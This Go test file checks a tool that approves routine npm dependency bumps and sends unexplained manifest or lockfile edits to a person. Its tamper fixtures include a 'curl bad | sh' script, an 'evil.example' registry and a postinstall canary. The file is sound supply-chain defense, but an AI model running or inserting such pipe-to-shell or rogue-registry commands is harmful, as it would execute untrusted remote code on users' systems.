package routinechange

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

func snapshot(version string) NPMSnapshot {
	integrity := base64.StdEncoding.EncodeToString(make([]byte, 64))
	return NPMSnapshot{
		Manifest: []byte(fmt.Sprintf(`{"name":"app","scripts":{"test":"node --test"},"devDependencies":{"typescript":"^%s"}}`, version)),
		Lock:     []byte(fmt.Sprintf(`{"name":"app","lockfileVersion":3,"requires":true,"packages":{"":{"name":"app","devDependencies":{"typescript":"^%s"}},"node_modules/typescript":{"version":"%s","resolved":"https://registry.npmjs.org/typescript/-/typescript-%s.tgz","integrity":"sha512-%s","dev":true}}}`, version, version, version, integrity)),
	}
}

func TestOnlyBoundedVersionChangesQualify(t *testing.T) {
	tests := []struct {
		next, bound string
		allowed     bool
	}{
		{"5.1.1", "patch", true}, {"5.2.0", "minor", true}, {"5.2.0", "patch", false}, {"6.0.0", "minor", false}, {"5.0.9", "minor", false}, {"5.1.0-beta.1", "minor", false}, {"5.1.0", "minor", false},
	}
	for _, tt := range tests {
		t.Run(tt.next+"/"+tt.bound, func(t *testing.T) {
			c, err := CompareNPM(snapshot("5.1.0"), snapshot(tt.next), tt.bound)
			if (err == nil) != tt.allowed {
				t.Fatalf("candidate=%+v err=%v", c, err)
			}
			if tt.allowed && (len(c.After) != 1 || !c.After[0].Changed || c.After[0].Name != "typescript") {
				t.Fatalf("missing identity: %+v", c)
			}
		})
	}
}

func TestUnexplainedManifestLockAndGraphEditsRequireAPerson(t *testing.T) {
	tests := []struct {
		name string
		edit func(*NPMSnapshot)
	}{
		{"script", func(s *NPMSnapshot) {
			s.Manifest = []byte(strings.ReplaceAll(string(s.Manifest), "node --test", "curl bad | sh"))
		}},
		{"unknown metadata", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), `"dev":true`, `"dev":true,"unexplained":42`))
		}},
		{"foreign registry", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), "registry.npmjs.org", "evil.example"))
		}},
		{"source userinfo", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), "https://registry", "https://secret@registry"))
		}},
		{"duplicate nested key", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), `"dev":true`, `"dev":false,"dev":true`))
		}},
		{"new dependency", func(s *NPMSnapshot) {
			s.Manifest = []byte(strings.ReplaceAll(string(s.Manifest), `"typescript":`, `"other":"1.0.0","typescript":`))
		}},
		{"install script", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), `"dev":true`, `"dev":true,"hasInstallScript":true`))
		}},
		{"optional", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), `"dev":true`, `"dev":true,"optional":true`))
		}},
		{"link", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), `"dev":true`, `"dev":true,"link":true`))
		}},
		{"missing root", func(s *NPMSnapshot) {
			s.Lock = []byte(strings.ReplaceAll(string(s.Lock), `"":{"name":"app","devDependencies":{"typescript":"^5.1.1"}},`, ``))
		}},
		{"range operator", func(s *NPMSnapshot) { s.Manifest = []byte(strings.ReplaceAll(string(s.Manifest), "^5.1.1", "~5.1.1")) }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			next := snapshot("5.1.1")
			tt.edit(&next)
			if _, err := CompareNPM(snapshot("5.1.0"), next, "minor"); err == nil {
				t.Fatal("unexplained change qualified")
			}
		})
	}
}

func TestDownloadedManifestCannotHideAnInstallScriptInTheLock(t *testing.T) {
	old, next := snapshot("5.1.0"), snapshot("5.1.1")
	c, err := CompareNPM(old, next, "patch")
	if err != nil {
		t.Fatal(err)
	}
	installed := map[string]json.RawMessage{"node_modules/typescript": json.RawMessage(`{"name":"typescript","version":"5.1.1"}`)}
	if err = VerifyInstalled(next, c.After, installed); err != nil {
		t.Fatal(err)
	}
	installed["node_modules/typescript"] = json.RawMessage(`{"name":"typescript","version":"5.1.1","scripts":{"postinstall":"touch /canary"}}`)
	if err = VerifyInstalled(next, c.After, installed); err == nil {
		t.Fatal("lock without hasInstallScript concealed actual lifecycle behavior")
	}
	installed["node_modules/typescript"] = json.RawMessage(`{"name":"typescript","version":"5.1.1","dependencies":{"hidden":"1.0.0"}}`)
	if err = VerifyInstalled(next, c.After, installed); err == nil {
		t.Fatal("unrecorded actual dependency accepted")
	}
}
